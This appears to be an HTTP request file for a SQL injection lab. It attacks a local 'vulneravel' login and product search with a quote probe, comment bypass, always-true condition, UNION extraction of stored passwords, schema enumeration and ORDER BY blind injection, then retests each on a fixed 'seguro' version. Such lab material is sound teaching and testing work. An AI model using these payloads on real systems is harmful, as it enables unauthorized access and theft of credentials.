### ===== Comportamento normal =====
POST http://localhost:8080/vulneravel/login
Content-Type: application/json

{"username": "maria", "password": "abc123"}

### ===== Ataque 1: sondagem com aspa =====
POST http://localhost:8080/vulneravel/login
Content-Type: application/json

{"username": "'", "password": "x"}

### ===== Ataque 2: bypass com comentário =====
POST http://localhost:8080/vulneravel/login
Content-Type: application/json

{"username": "admin'--", "password": "qualquer"}

### ===== Ataque 3: condição sempre verdadeira =====
POST http://localhost:8080/vulneravel/login
Content-Type: application/json

{"username": "x", "password": "' OR '1'='1"}

### ===== Ataque 4: UNION (vaza usuários e senhas) =====
GET http://localhost:8080/vulneravel/produtos?busca=zzz' UNION SELECT id, name, password FROM users --

### ===== Ataque 4b: descobrir tabelas/colunas =====
GET http://localhost:8080/vulneravel/produtos?busca=zzz' UNION SELECT 1, table_name, column_name FROM information_schema.columns WHERE table_schema='PUBLIC' --

### ===== Ataque 5: ORDER BY blind =====
GET http://localhost:8080/vulneravel/produtos?ordenar=CASE WHEN (SELECT COUNT(*) FROM users WHERE name='admin')>0 THEN -id ELSE id END


### ############ RETESTE na versão SEGURA ############

### Uso legítimo
POST http://localhost:8080/seguro/login
Content-Type: application/json

{"username": "maria", "password": "abc123"}

### Bypass (deve dar 401)
POST http://localhost:8080/seguro/login
Content-Type: application/json

{"username": "admin'--", "password": "qualquer"}

### UNION (deve retornar lista vazia)
GET http://localhost:8080/seguro/produtos?busca=zzz' UNION SELECT id, name, password FROM users --

### ORDER BY malicioso (ignorado pela allowlist)
GET http://localhost:8080/seguro/produtos?ordenar=CASE WHEN (SELECT COUNT(*) FROM users WHERE name='admin')>0 THEN -id ELSE id END

### Ordenação válida
GET http://localhost:8080/seguro/produtos?ordenar=nome
